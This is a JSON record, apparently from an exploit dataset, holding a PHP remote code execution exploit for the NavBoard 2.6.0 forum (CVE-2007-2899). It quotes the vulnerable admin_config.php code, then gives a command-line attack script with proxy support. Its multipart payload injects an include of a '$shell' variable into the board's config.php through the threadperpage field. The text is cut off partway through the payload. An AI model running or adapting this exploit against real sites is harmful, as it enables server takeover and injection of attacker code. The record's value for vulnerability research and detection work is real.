{
  "id": "3971",
  "title": "NavBoard 2.6.0 - Remote Code Execution",
  "cve": "CVE-2007-2899",
  "vuln_type": "rce",
  "code": "<?php\r\n\r\n/*\r\n        \\\\\\|///\r\n      \\\\  - -  //\r\n       (  @ @ )\r\n----oOOo--(_)-oOOo---------------------------------------------------\r\n\r\n[ Y! Underground Group ]\r\n[   Dj7xpl@yahoo.com   ]\r\n[    Dj7xpl.2600.ir    ]\r\n\r\n----ooooO-----Ooooo--------------------------------------------------\r\n    (   )     (   )\r\n     \\ (       ) /\r\n      \\_)     (_/\r\n\r\n---------------------------------------------------------------------\r\n\r\n[!] Portal        :   NavBoard 2.6.0\r\n[!] Download      :   http://www.sourceforge.net/projects/navboard\r\n[!] Type          :   Remote Code Execution Exploit\r\n\r\n---------------------------------------------------------------------\r\n*/\r\n\r\n/*\r\nVuln Code :\r\n\r\n[Code]\r\n\r\nif(!$editconfig){\r\n\r\n tableheader1();\r\n print \"<form action=\\\"admin_config.php\\\" method=post>\";\r\n print \"<input type=hidden name=\\\"editconfig\\\" value=\\\"1\\\" size=40>\"; \r\n print \"<tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Main forum settings</b>\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Board Title\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"boardtitle\\\" value=\\\"$configarray[0]\\\" size=40 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Admin email address (blank will not display)\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"adminemail\\\" value=\\\"$configarray[35]\\\" size=40 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Main website address (NOT forum address, blank will display forum address)\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"mainwebsite\\\" value=\\\"$configarray[36]\\\" size=40 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Display text title instead of graphic logo for faster loading<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n if($configarray[34]==\"on\")\r\n {print \"<input type=checkbox name=\\\"textlogo\\\" class=\\\"forminput\\\" checked>\";}\r\n else{print \"<input type=checkbox name=\\\"textlogo\\\" class=\\\"forminput\\\">\";}\r\n print \"</span></td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n \r\n print \"<b>Forums</b><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max levels of subforums to display on one page (less will make for faster loading)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxsubforumdisplay\\\" value=\\\"$configarray[27]\\\" size=2 class=\\\"forminput\\\">\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Don't find forum reply count on the fly, recount during posting<br>(faster forum page, may slow posting slightly)\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n if($configarray[42]==\"on\"){\r\n print \"<input type=checkbox name=\\\"dontscanreplycount\\\" class=\\\"forminput\\\" checked>\";\r\n }else{print \"<input type=checkbox name=\\\"dontscanreplycount\\\" class=\\\"forminput\\\">\";}\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Forum/Thread indenting amount<br>Percentage of title cell used for indent spaing\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"indentspacing\\\" value=\\\"$configarray[44]\\\" size=2 class=\\\"forminput\\\">%\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n \r\n print \"<b>Posts</b><br>\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Seconds before user may add another post (flood control)\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"postfloodcontrolsec\\\" value=\\\"$configarray[37]\\\" size=2 class=\\\"forminput\\\">\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Amount of nested bbcodes allowed<br>(how many times a bbcode tag can be put over itself) 3 is default\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"nestedbbcodes\\\" value=\\\"$configarray[43]\\\" size=2 class=\\\"forminput\\\">\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Show names for user levels instead of imageicons:<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n if($configarray[45]==\"on\"){\r\n print \"<input type=checkbox name=\\\"userlevelnames\\\" class=\\\"forminput\\\" checked>\";\r\n }else{\r\n print \"<input type=checkbox name=\\\"userlevelnames\\\" class=\\\"forminput\\\">\";\r\n }\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Show all edits instead of only last edit on posts<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n if($configarray[46]==\"on\"){\r\n print \"<input type=checkbox name=\\\"showalledits\\\" class=\\\"forminput\\\" checked>\";\r\n }else{\r\n print \"<input type=checkbox name=\\\"showalledits\\\" class=\\\"forminput\\\">\";\r\n }\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n \r\n print \"<b>Registration</b><br>\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Seconds before another account can be registered (flood control)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"regfloodcontrolsec\\\" value=\\\"$configarray[38]\\\" size=2 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Method of registration<br>\";\r\n print \"NOTE: Mailing in php must be setup correctly on your server to work with email confirmation\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n if($configarray[39]==\"on\"||$configarray[39]==\"\"){\r\n print \"<input type=radio name=\\\"registration\\\" value=\\\"on\\\" class=\\\"forminput\\\" checked> \";\r\n }else{\r\n print \"<input type=radio name=\\\"registration\\\" value=\\\"on\\\" class=\\\"forminput\\\"> \";\r\n }\r\n print \"Allowed<br>\";\r\n if($configarray[39]==\"confirm\"){\r\n print \"<input type=radio name=\\\"registration\\\" value=\\\"confirm\\\" class=\\\"forminput\\\" checked> \";\r\n }else{\r\n print \"<input type=radio name=\\\"registration\\\" value=\\\"confirm\\\" class=\\\"forminput\\\"> \";\r\n }\r\n print \"Email confirmed<br>\";\r\n if($configarray[39]==\"approve\"){\r\n print \"<input type=radio name=\\\"registration\\\" value=\\\"approve\\\" class=\\\"forminput\\\" checked> \";\r\n }else{\r\n print \"<input type=radio name=\\\"registration\\\" value=\\\"approve\\\" class=\\\"forminput\\\"> \";\r\n }\r\n print \"Admin approved\";\r\n print \"</span></td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Profiles</b>\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Allow duplicate display names<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n if($configarray[32]==\"on\"){\r\n print \"<input type=checkbox name=\\\"allowdupdisplay\\\" class=\\\"forminput\\\" checked>\";\r\n }else{\r\n print \"<input type=checkbox name=\\\"allowdupdisplay\\\" class=\\\"forminput\\\">\";\r\n }\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Display name changing<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n if($configarray[41]==\"off\"){\r\n print \"<input type=radio name=\\\"displaychange\\\" value=\\\"off\\\" class=\\\"forminput\\\" checked> \";\r\n }else{\r\n print \"<input type=radio name=\\\"displaychange\\\" value=\\\"off\\\" class=\\\"forminput\\\"> \";\r\n }\r\n print \"Not allowed<br>\";\r\n if($configarray[41]==\"on\"||$configarray[41]==\"\"){\r\n print \"<input type=radio name=\\\"displaychange\\\" value=\\\"on\\\" class=\\\"forminput\\\" checked> \";\r\n }else{\r\n print \"<input type=radio name=\\\"displaychange\\\" value=\\\"on\\\" class=\\\"forminput\\\"> \";\r\n }\r\n print \"Allowed<br>\";\r\n if($configarray[41]==\"approve\"){\r\n print \"<input type=radio name=\\\"displaychange\\\" value=\\\"approve\\\" class=\\\"forminput\\\" checked> \";\r\n }else{\r\n print \"<input type=radio name=\\\"displaychange\\\" value=\\\"approve\\\" class=\\\"forminput\\\"> \";\r\n }\r\n print \"Admin approved\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Default time format (php <a href=\\\"http://www.php.net/manual/en/function.date.php\\\" target=\\\"_new\\\">date</a> format) \";\r\n print \"Recommended: n-j-Y h:iA <br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"defaulttime\\\" value=\\\"$configarray[33]\\\" size=40 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max people on individual users buddy lists\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"buddylistmax\\\" value=\\\"$configarray[28]\\\" size=2 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Avatars</b><br>\";\r\n print \"</span></td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Avatar file size limit (bytes)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"avatarfilesize\\\" value=\\\"$configarray[9]\\\" size=20 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Avatar dimensions limit (height)x(width)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"avatardimension\\\" value=\\\"$configarray[10]\\\" size=20 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Attachments</b>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Allowed attachment extensions (separated by commas) (blank would allow no attachments)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"allowedattachext\\\" value=\\\"$configarray[22]\\\" size=40 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max size of attachments (in bytes)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxattachsize\\\" value=\\\"$configarray[23]\\\" size=20 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max total size of all attachments (in bytes)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxtotalattachsize\\\" value=\\\"$configarray[31]\\\" size=20 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Polls</b>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max poll options<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxpolloptions\\\" value=\\\"$configarray[24]\\\" size=2 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Theme</b><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Default theme<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n $themesarray=listdirs(\"themes\");\r\n print \"<select size=1 name=\\\"defaulttheme\\\" size=40 class=\\\"forminput\\\">\\n\";\r\n for($n=0;$n<count($themesarray);$n++){\r\n\r\n  if($themesarray[$n]==$configarray[12]){\r\n  print \"<option value=\\\"$themesarray[$n]\\\" selected>$themesarray[$n]</option>\";\r\n  }else{\r\n  print \"<option value=\\\"$themesarray[$n]\\\">$themesarray[$n]</option>\";\r\n  }\r\n\r\n }\r\n print \"</select>\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Online users</b><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Seconds of inactivity before user is removed from online list (300seconds=5minutes)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"inactivityseconds\\\" value=\\\"$configarray[13]\\\" size=2 class=\\\"forminput\\\">\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Page settings</b>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Threads to show per page in forum<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"threadperpage\\\" value=\\\"$configarray[7]\\\" size=2 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Posts to show per page in thread<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"postperpage\\\" value=\\\"$configarray[8]\\\" size=2 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Max character settings</b><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max total characters in body of posts<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxcharsbody\\\" value=\\\"$configarray[18]\\\" size=5 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max total characters in subject of posts<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxcharssubject\\\" value=\\\"$configarray[25]\\\" size=5 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max total characters in signatures<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxcharssigs\\\" value=\\\"$configarray[19]\\\" size=5 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Enabling/Disabling</b>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Allow HTML in posts:<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n if($configarray[14]==\"allowhtml\"){\r\n print \"<input type=checkbox name=\\\"html\\\" class=\\\"forminput\\\" checked>\";\r\n }else{\r\n print \"<input type=checkbox name=\\\"html\\\" class=\\\"forminput\\\">\";\r\n }\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Enable GZ Compression:<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n if($configarray[21]==\"disablegz\"){\r\n print \"<input type=checkbox name=\\\"gzcompress\\\" class=\\\"forminput\\\">\";\r\n }else{\r\n print \"<input type=checkbox name=\\\"gzcompress\\\" class=\\\"forminput\\\" checked>\";\r\n } \r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Private Messaging</b><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max total size of pms per user (bytes)<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxpmsize\\\" value=\\\"$configarray[29]\\\" size=10 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Max total number of pms per user<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"maxpmnumber\\\" value=\\\"$configarray[30]\\\" size=10 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tableheadercell\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<b>Board Closing</b>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell1\\\" width=\\\"50%\\\"><span class=\\\"textlarge\\\">\";\r\n print \"Entering info here will cause the entire bulletin board to be closed<br>\";\r\n print \"This is the message that shows up when the board is closed<br>\";\r\n print \"</span></td><td class=\\\"tablecell2\\\" width=\\\"50%\\\">\";\r\n print \"<input type=text name=\\\"boardclosing\\\" value=\\\"$configarray[40]\\\" size=60 class=\\\"forminput\\\"><br>\";\r\n print \"</td></tr><tr><td class=\\\"tablecell2\\\" colspan=\\\"2\\\"><span class=\\\"textlarge\\\">\";\r\n print \"<input type=submit name=\\\"submit\\\" value=\\\"Update\\\" class=\\\"formbutton\\\">\";\r\n print \"</span>\";\r\n print \"</td>\";\r\n print \"</form>\";\r\n print \"</tr>\";\r\n print \"</table>\";\r\n }\r\n\r\n if($editconfig){\r\n\r\n $boardtitle=stripslashes($boardtitle);\r\n $boardtitle=htmlentities($boardtitle);\r\n writedata(\"$maindatadir/config.php\",$boardtitle,0);\r\n writedata(\"$maindatadir/config.php\",$threadperpage,7);\r\n writedata(\"$maindatadir/config.php\",$postperpage,8);\r\n writedata(\"$maindatadir/config.php\",$avatarfilesize,9);\r\n writedata(\"$maindatadir/config.php\",$avatardimension,10);\r\n writedata(\"$maindatadir/config.php\",$defaulttheme,12);\r\n writedata(\"$maindatadir/config.php\",$inactivityseconds,13);\r\n if($html==\"on\"){\r\n writedata(\"$maindatadir/config.php\",\"allowhtml\",14);\r\n }else{\r\n writedata(\"$maindatadir/config.php\",\"denyhtml\",14);\r\n }\r\n writedata(\"$maindatadir/config.php\",$maxcharsbody,18);\r\n writedata(\"$maindatadir/config.php\",$maxcharssigs,19);\r\n if($gzcompress==\"on\"){\r\n writedata(\"$maindatadir/config.php\",\"enablegz\",21);\r\n }else{\r\n writedata(\"$maindatadir/config.php\",\"disablegz\",21);\r\n }\r\n writedata(\"$maindatadir/config.php\",$allowedattachext,22);\r\n writedata(\"$maindatadir/config.php\",$maxattachsize,23);\r\n writedata(\"$maindatadir/config.php\",$maxpolloptions,24);\r\n writedata(\"$maindatadir/config.php\",$maxcharssubject,25);\r\n writedata(\"$maindatadir/config.php\",$maxsubforumdisplay,27);\r\n writedata(\"$maindatadir/config.php\",$buddylistmax,28);\r\n writedata(\"$maindatadir/config.php\",$maxpmsize,29);\r\n writedata(\"$maindatadir/config.php\",$maxpmnumber,30);\r\n writedata(\"$maindatadir/config.php\",$maxtotalattachsize,31);\r\n writedata(\"$maindatadir/config.php\",$allowdupdisplay,32);\r\n writedata(\"$maindatadir/config.php\",$defaulttime,33);\r\n writedata(\"$maindatadir/config.php\",$textlogo,34);\r\n writedata(\"$maindatadir/config.php\",$adminemail,35);\r\n writedata(\"$maindatadir/config.php\",$mainwebsite,36);\r\n writedata(\"$maindatadir/config.php\",$postfloodcontrolsec,37);\r\n writedata(\"$maindatadir/config.php\",$regfloodcontrolsec,38);\r\n writedata(\"$maindatadir/config.php\",$registration,39);\r\n writedata(\"$maindatadir/config.php\",$boardclosing,40);\r\n writedata(\"$maindatadir/config.php\",$displaychange,41);\r\n \r\n if($configarray[42]!==\"on\"&&$dontscanreplycount==\"on\"){//if turning on for first time, make a recount\r\n  for($n=0;$n<count($forumarray);$n++){\r\n  $topicarray=listdirs(\"$configarray[2]/$forumarray[$n]\");\r\n  $replies=0;\r\n   for($m=0;$m<count($topicarray);$m++){\r\n    $postarray2=listfiles(\"$configarray[2]/$forumarray[$n]/$topicarray[$m]\");\r\n    $replies+=count($postarray2)-1;\r\n   }\r\n  writedata(\"$configarray[2]/$forumarray[$n].php\",$replies,11);\r\n  }\r\n writedata(\"$maindatadir/config.php\",$dontscanreplycount,42);\r\n }else{\r\n writedata(\"$maindatadir/config.php\",$dontscanreplycount,42);\r\n }\r\n \r\n writedata(\"$maindatadir/config.php\",$nestedbbcodes,43);\r\n writedata(\"$maindatadir/config.php\",$indentspacing,44);\r\n writedata(\"$maindatadir/config.php\",$userlevelnames,45);\r\n writedata(\"$maindatadir/config.php\",$showalledits,46);\r\n\r\n\r\n[/Code]\r\n*/\r\n\r\nif ($argc<2) {\r\nprint_r('\r\n-----------------------------------------------------------------------------\r\n\r\nUsage: php '.$argv[0].' Host Path Options\r\nhost:       Target server (ip/hostname)\r\npath:       Path To Folder\r\n\r\nOptions:\r\n -p[port]:    specify a port other than 80\r\n -P[ip:port]: specify a proxy\r\n\r\nExample:\r\nphp '.$argv[0].' 127.0.0.1 /Forum/ -P1.1.1.1:80\r\n\r\n-----------------------------------------------------------------------------\r\n');\r\n\r\ndie;\r\n}\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacket($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$port=80;\r\n$proxy=\"\";\r\nfor ($i=7; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\")) {$cmd.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n/*Data*/\r\n\r\n$data.='-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"editconfig\"\r\n\r\n\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"boardtitle\"\r\n\r\nDj7xpl\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"threadperpage\"\r\n\r\nwww\\\";include \\\"\\$shell\\\";\\/\\/\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"postperpage\"\r\n\r\nDj7xpl\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"avatarfilesize\"\r\n\r\n11\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"avatardimension\"\r\n\r\n123\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"defaulttheme\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"inactivityseconds\"\r\n\r\n#CCFF00\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"html\"\r\n\r\non\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxcharsbody\"\r\n\r\n111\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxcharssigs\"\r\n\r\n11122\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"gzcompress\"\r\n\r\non\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"allowedattachext\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxattachsize\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxpolloptions\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxcharssubject\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxsubforumdisplay\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"buddylistmax\"\r\n\r\nred\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"maxpmsize\"\r\n\r\nDj7xpl\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; 